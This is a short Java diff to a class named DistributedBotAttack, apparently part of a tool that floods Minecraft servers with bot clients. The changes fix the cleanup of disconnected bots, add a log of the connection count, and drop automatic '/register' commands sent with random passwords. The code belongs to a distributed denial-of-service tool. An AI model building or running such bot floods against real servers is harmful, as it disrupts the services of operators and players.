@@ -13,7 +13,6 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 import org.spacehq.mc.protocol.MinecraftProtocol;
-import org.spacehq.mc.protocol.packet.ingame.client.ClientChatPacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientPluginMessagePacket;
 import org.spacehq.mc.protocol.packet.ingame.client.ClientTabCompletePacket;
 import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
@@ -65,6 +64,7 @@ public class DistributedBotAttack extends IAttack {
 						stop();
 						return;
 					}
+					Utils.log("BotThread", "连接数:"+clients.size());
 				}catch(Exception e){
 					Utils.log("BotThread",e.getMessage());
 				}
@@ -102,7 +102,7 @@ public class DistributedBotAttack extends IAttack {
 		List<Client> waitRemove=new ArrayList<Client>();
 		synchronized (clients) {
 			clients.forEach(c->{
-				if(c.getSession().isConnected()) {
+				if(!c.getSession().isConnected()) {
 					waitRemove.add(c);
 				}
 			});
@@ -154,11 +154,6 @@ public class DistributedBotAttack extends IAttack {
  					}
 				}else if (e.getPacket() instanceof ServerJoinGamePacket) {
 					Utils.log("Client","[连接成功]["+username+"]");
-					new Thread(()-> {
-						String pwd=Utils.getRandomString(8,12);
-						Utils.sleep(5000);
-						client.getSession().send(new ClientChatPacket("/register "+pwd+" "+pwd));
-					}).start();
 				}
 			}
 			public void packetSent(PacketSentEvent e){}
@@ -171,7 +166,7 @@ public class DistributedBotAttack extends IAttack {
 				}else{
 					msg=e.getReason();
 				}
-				Utils.log("Client","[断开连接]["+username+"] " +msg);
+				Utils.log("Client","[断开]["+username+"] " +msg);
 			}
 		});
 		return client;
